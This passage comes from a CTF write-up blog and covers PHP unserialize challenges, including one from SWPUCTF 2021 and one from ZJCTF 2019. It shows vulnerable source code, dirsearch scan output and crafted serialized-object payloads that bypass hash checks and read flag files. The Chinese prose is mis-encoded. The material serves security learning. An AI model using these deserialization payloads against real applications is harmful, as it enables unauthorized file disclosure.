<span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]));<br></code></pre></td></tr></table></figure>
<p>å®¡è®¡ï¼š<br>å¤§æ¦‚æ˜¯ä¸‰ä¸ªå˜é‡a,b,fileï¼Œè¿˜æœ‰ä¸€ä¸ªååºåˆ—åŒ–æ¿€æ´»çš„ __wakeup(),å…ˆæ˜¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p>ä¸è®©ç”¨æ•°ç»„ç»•è¿‡<br>ç„¶åæ˜¯ç»•è¿‡æ¡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )<br></code></pre></td></tr></table></figure>
<p>è¦æ±‚aå’Œbå¼±æ¯”è¾ƒä¸åŒï¼Œ&amp;&amp;aå’Œbçš„md5å’Œsha1å€¼ç›¸åŒ<br>ç„¶åçœ‹ä¸æ‡‚äº†  </p>
<blockquote>
<p>åˆ†æï¼š<br>ï¼ˆ1ï¼‰wakeupæ–¹æ³•é¦–å…ˆç¦ç”¨äº†æ•°ç»„ï¼Œæ‰€ä»¥ä¸èƒ½ç»™æˆå‘˜å˜é‡aå’Œbèµ‹å€¼æ•°ç»„ï¼Œéœ€è¦ä½¿ç”¨å…¶ä»–æ–¹æ³•ç»•è¿‡ä¸‹é¢çš„md5å’Œsha1ã€‚<br>ï¼ˆ2ï¼‰å› ä¸ºæ¯”è¾ƒå˜é‡ä½¿ç”¨çš„æ˜¯å¼±æ¯”è¾ƒï¼ˆ!&#x3D;&#x3D;ï¼‰ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥ç»™aã€bèµ‹å€¼åŒå€¼ä¸åŒç±»ï¼Œä¾‹å¦‚a&#x3D;1ã€b&#x3D;â€™1â€™ï¼ŒäºŒè€…md5å€¼å’Œsha1å€¼ç›¸åŒï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥ã€‚<br>ï¼ˆ3ï¼‰å˜é‡contentæ¥å—ç»è¿‡dateæ—¥æœŸæ ¼å¼åŒ–åçš„å˜é‡fileã€‚<br>å¯¹äºdate()æ–¹æ³•ï¼š<br>è¯¥æ–¹æ³•ä¼šæ£€æµ‹ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦æœ‰ç‰¹å®šçš„æ ¼å¼åŒ–å­—ç¬¦ï¼Œå¦‚Yï¼ˆå¹´ä»½ï¼‰ã€mï¼ˆæœˆä»½ï¼‰ã€dï¼ˆå¤©ï¼‰ã€Hï¼ˆæ—¶ï¼‰ã€iï¼ˆåˆ†é’Ÿï¼‰ã€sï¼ˆç§’ï¼‰ç­‰<br>æ£€æµ‹å­˜åœ¨åˆ™ä¼šå°†æ ¼å¼åŒ–å­—ç¬¦æ›¿æ¢ä¸ºå½“å‰æ—¶é—´çš„å¯¹åº”éƒ¨åˆ†ï¼Œå¦åˆ™å°†å­—ç¬¦è¿›è¡ŒåŸæ ·è¾“å‡ºï¼ŒåŒæ—¶å¯ç”¨è½¬ä¹‰å­—ç¬¦å°†æ ¼å¼åŒ–å­—ç¬¦åŸæ ·è¾“å‡º<br>ï¼ˆ4ï¼‰uniqid()æ–¹æ³•ä¼šç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„æ–‡ä»¶åï¼Œå¹¶ä¸åç¼€â€œ.txtâ€æ‹¼æ¥æˆå˜é‡uuidã€‚<br>ï¼ˆ5ï¼‰file_put_contents()æ–¹æ³•ä¼šå°†contentçš„å†…å®¹å†™å…¥uuidè¡¨ç¤ºçš„æ–‡æœ¬æ–‡æ¡£ä¸­ã€‚å¯¹æ–‡æœ¬æ–‡æ¡£çš„å†…å®¹è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œå»é™¤å†…å®¹ä¸­çš„ç©ºæ ¼å’Œæ¢è¡Œç¬¦ï¼Œèµ‹å€¼ç»™å˜é‡æ‰“ä»–ã€‚<br>ï¼ˆ6ï¼‰æ˜¾ç¤ºå˜é‡dataçš„å†…å®¹ã€‚<br>ç»¼ä¸Šï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡æ£€æµ‹ï¼Œä¸ºå˜é‡fileèµ‹å€¼ä¸€ä¸ªä¸ä¼šè¢«dateæ–¹æ³•æ ¼å¼åŒ–çš„flagè·¯å¾„ï¼Œè¯»å–åˆ°flagåï¼Œå€Ÿç”±å˜é‡dataæ˜¾ç¤ºå‡ºæ¥ã€‚<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuspace/p/18114039">https://www.cnblogs.com/yuspace/p/18114039</a></p>
</blockquote>
<p>é‡è¦çš„æ¥äº†<br>KIMI:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-comment">//ä½œç”¨ï¼šå°è¯•å°†$dataä½œä¸ºæ–‡ä»¶è·¯å¾„ï¼Œè¯»å–è¯¥è·¯å¾„ä¸‹çš„æ–‡ä»¶å†…å®¹å¹¶è¾“å‡ºåˆ°æµè§ˆå™¨ã€‚è¿™é‡Œå¯èƒ½å­˜åœ¨è·¯å¾„éå†æˆ–æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¦‚æœ$dataçš„å€¼å¯æ§ä¸”æœªç»è¿‡å……åˆ†éªŒè¯ã€‚</span><br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br><span class="hljs-comment">//ä½œç”¨ï¼šè¯»å–åˆšåˆšåˆ›å»ºçš„$uuidæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼preg_replace()å»é™¤å…¶ä¸­çš„ç©ºç™½å­—ç¬¦ï¼ˆåŒ…æ‹¬ç©ºæ ¼ã€æ¢è¡Œç¬¦ç­‰ï¼‰ã€‚æœ€ç»ˆç»“æœå­˜å‚¨åœ¨$dataå˜é‡ä¸­ã€‚</span><br></code></pre></td></tr></table></figure>
<p>æœ€åpayload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();<br><span class="hljs-comment">//åŒå€¼ä¸åŒç±»ï¼Œé€šè¿‡ä¸‰ä¸ªæ£€æµ‹</span><br><span class="hljs-variable">$a</span>-&gt;a=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$a</span>-&gt;b=<span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-comment">//æ­¤å¤„fileçš„å†…å®¹åœ¨ç»è¿‡data()æ–¹æ³•æ ¼å¼åŒ–åæ˜¾ç¤ºä¸º/flag</span><br><span class="hljs-variable">$a</span>-&gt;file=<span class="hljs-string">&quot;/f\l\a\g&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//è¾“å‡º:Tzo0OiJkYXRlIjozOntzOjE6ImEiO2k6MTtzOjE6ImIiO3M6MToiMSI7czo0OiJmaWxlIjtzOjg6Ii9mXGxcYVxnIjt9</span><br><br></code></pre></td></tr></table></figure>
<p>by <a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuspace/p/18114039">https://www.cnblogs.com/yuspace/p/18114039</a></p>
<h2 id="å€¼åŒç±»ä¸åŒ"><a href="#å€¼åŒç±»ä¸åŒ" class="headerlink" title="å€¼åŒç±»ä¸åŒ"></a>å€¼åŒç±»ä¸åŒ</h2><p>$this-&gt;a !&#x3D;&#x3D; $this-&gt;bï¼š  </p>
<p>$this-&gt;a æ˜¯æ•´æ•° 1ï¼Œ$this-&gt;b æ˜¯å­—ç¬¦ä¸² â€˜1â€™ã€‚åœ¨ PHP ä¸­ï¼Œå®ƒä»¬çš„å€¼è™½ç„¶ç›¸ç­‰ï¼Œä½†ç±»å‹ä¸åŒï¼Œå› æ­¤ !&#x3D;&#x3D; æ¯”è¾ƒç»“æœä¸º trueã€‚</p>
<p>md5($this-&gt;a) &#x3D;&#x3D;&#x3D; md5($this-&gt;b)ï¼š</p>
<p>å½“ä½ å°†æ•´æ•° 1 ä¼ é€’ç»™ md5() å‡½æ•°æ—¶ï¼ŒPHP ä¼šå°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸² â€˜1â€™ï¼Œå› æ­¤ md5(1) å’Œ md5(â€˜1â€™) çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚</p>
<p>sha1($this-&gt;a) &#x3D;&#x3D;&#x3D; sha1($this-&gt;b)ï¼š</p>
<p>åŒæ ·ï¼Œsha1() å‡½æ•°ä¹Ÿä¼šå°†æ•´æ•° 1 è½¬æ¢ä¸ºå­—ç¬¦ä¸² â€˜1â€™ï¼Œå› æ­¤ sha1(1) å’Œ sha1(â€˜1â€™) çš„ç»“æœä¹Ÿæ˜¯ç›¸åŒçš„ã€‚</p>
<hr>
<h2 id="title-note-17date-2025-03-23-13-38-39tags-unseirlize"><a href="#title-note-17date-2025-03-23-13-38-39tags-unseirlize" class="headerlink" title="title: note-17date: 2025-03-23 13:38:39tags: unseirlize"></a>title: note-17<br>date: 2025-03-23 13:38:39<br>tags: unseirlize</h2><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-ez-unserialize"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]ez_unserialize"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]ez_unserialize</h1><p>æ²¡æƒ³åˆ°æˆ‘ä¹Ÿæœ‰èƒ½ç§’ååºåˆ—åŒ–çš„ä¸€å¤©ï¼Œè¿˜ä»¥ä¸ºæ°¸è¿œå…¥ä¸äº†é—¨äº†<br>æ‹¿åˆ°é¢˜ç›®å‘ç°åªæœ‰ä¸€ä¸ªé™æ€é¡µé¢<br>ç„¶ådirsearchæ‰«</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs log">[13:31:24] Starting:<br>[13:31:28] 403 -  309B  - /.ht_wsr.txt<br>[13:31:28] 403 -  312B  - /.htaccess.bak1<br>[13:31:28] 403 -  312B  - /.htaccess.save<br>[13:31:28] 403 -  314B  - /.htaccess.sample<br>[13:31:28] 403 -  310B  - /.htaccess_sc<br>[13:31:28] 403 -  313B  - /.htaccess_extra<br>[13:31:28] 403 -  312B  - /.htaccess.orig<br>[13:31:28] 403 -  310B  - /.htaccessBAK<br>[13:31:28] 403 -  312B  - /.htaccess_orig<br>[13:31:28] 403 -  310B  - /.htaccessOLD<br>[13:31:28] 403 -  311B  - /.htaccessOLD2<br>[13:31:28] 403 -  302B  - /.htm<br>[13:31:28] 403 -  303B  - /.html<br>[13:31:28] 403 -  312B  - /.htpasswd_test<br>[13:31:28] 403 -  309B  - /.httr-oauth<br>[13:31:28] 403 -  308B  - /.htpasswds<br>[13:31:45] 200 -    0B  - /flag.php<br>[13:31:56] 200 -   35B  - /robots.txt<br>[13:31:57] 403 -  311B  - /server-status<br>[13:31:57] 403 -  312B  - /server-status/<br></code></pre></td></tr></table></figure>
<p>ç›´æ¥è®¿é—®flag.phpæ— æœï¼Œ<br>è®¿é—®robots.txt  </p>
<h2 id="notice-1"><a href="#notice-1" class="headerlink" title="notice"></a>notice</h2><p>robotså¤§æ¦‚ä½œç”¨åº”è¯¥æ˜¯ç”¨æ¥å‘Šè¯‰æœç´¢å¼•æ“ä¸èƒ½çˆ¬å–å“ªäº›é¡µé¢ï¼Œæ²¡æœ‰å¼ºåˆ¶æ€§ä½œç”¨</p>
<p>åœ¨robotsé‡Œå‘ç°&#x2F;cl45s.php<br>è®¿é—®å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;cl45s.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;ctf&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just a bit more!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br></code></pre></td></tr></table></figure>
<p>å†™äº†ä¸ªpayloadï¼Œä¸€æ¬¡æˆåŠŸ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;cl45s.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;ctf&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just a bit more!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">wllm</span>();<br><span class="hljs-variable">$a</span>-&gt;admin=<span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;passwd=<span class="hljs-string">&quot;ctf&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">///è¿è¡Œå¾—åˆ°:O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></code></pre></td></tr></table></figure>
<p>ç›´æ¥getä¼ å¾—åˆ°flag</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/?p=O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;<br></code></pre></td></tr></table></figure>

<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>æ²¡çœ‹æ‡‚ä¸ºå•¥getä¼ å¥½åƒä¼ ä¸è¿›å»<br>å»çœ‹å¤§ä½¬çš„wp</p>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/3017">https://www.nssctf.cn/note/set/3017</a>   </p>
